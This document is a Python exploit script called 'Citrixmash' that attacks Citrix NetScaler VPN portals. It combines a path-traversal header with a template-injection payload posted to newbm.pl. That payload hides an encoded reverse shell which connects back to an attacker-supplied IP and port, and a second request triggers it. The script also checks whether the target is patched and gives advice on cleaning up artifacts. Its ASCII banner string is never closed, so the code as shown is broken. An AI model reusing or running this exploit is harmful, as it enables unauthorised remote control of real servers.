import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable warnings
import random
import string
import time
from random import randint
import argparse
import sys

# random string generator
def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

# our random string for filename - will leave artifacts on system
filename = randomString()
randomuser = randomString()

# generate random number for the nonce
nonce = randint(5, 15) 

# this is our first stage which will write out the file through the Citrix traversal issue and the newbm.pl script
# note that the file location will be in /netscaler/portal/templates/filename.xml
def stage1(filename, randomuser, nonce, victimip, victimport, attackerip, attackerport):

    # encoding our payload stub for one netcat listener - awesome work here Rob Simon (KC)
    encoded = ""
    i=0
    text = ("""/var/python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (attackerip, attackerport))
    while i < len(text):
        encoded = encoded + "chr("+str(ord(text[i]))+") . "
        i += 1
    encoded = encoded[:-3]
    payload="[% template.new({'BLOCK'='print readpipe(" + encoded + ")'})%]"
    headers = ( 
        {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',
            'NSC_USER' : '../../../netscaler/portal/templates/%s' % (filename),
            'NSC_NONCE' : '%s' % (nonce),
        })

    data = (
        {
            "url" : "127.0.0.1",
            "title" : payload,
            "desc" : "desc",
            "UI_inuse" : "a"
        })

    # add support for port 80
    if victimport == ("80"):
        url = ("http://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (victimip, victimport))
    else:
        url = ("https://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (victimip, victimport))
    req = requests.post(url, data=data, headers=headers, verify=False)

    if ("Citrix") in str(req.content) or "403" in str(req.status_code):
        print("[\033[91m!\033[0m] The exploit failed due to the system being patched. Exiting Citrixmash.")
        sys.exit()

# this is our second stage that triggers the exploit for us
def stage2(filename, randomuser, nonce, victimip, victimport):
    headers = (
        {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',
            'NSC_USER' : '%s' % (randomuser),
            'NSC_NONCE' : '%s' % (nonce),
        })

    requests.get("https://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename), headers=headers, verify=False)


# start our main code to execute
print('''
  .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :



# parse our commands
parser = argparse.ArgumentParser()
parser.add_argument("target", help="the vulnerable server with Citrix hostname or IP (defaults https)")
parser.add_argument("targetport", help="the target server web port (normally on 443)")
parser.add_argument("attackerip", help="the attackers reverse listener IP or hostname address")
parser.add_argument("attackerport", help="the attackers reverse listener port")
args = parser.parse_args()
print("[*] Firing STAGE1 POST request to create the XML template exploit to disk...")
print("[*] Saving filename as %s.xml on the victim machine..." % (filename))
# trigger our first post
stage1(filename, randomuser, nonce, args.target, args.targetport, args.attackerip, args.attackerport)
print("[*] Sleeping for 2 seconds to ensure file is written before we call it...")
time.sleep(2)
print("[*] Triggering GET request for the newly created file with a listener waiting...")
print("[*] Shell should now be in your listener... enjoy. Keep this window open..")
print("[!] Be sure to cleanup the two locations here (artifacts): /var/tmp/netscaler/portal/templates/, /netscaler/portal/templates/")
# trigger our second post
stage2(filename, randomuser, nonce, args.target, args.targetport)
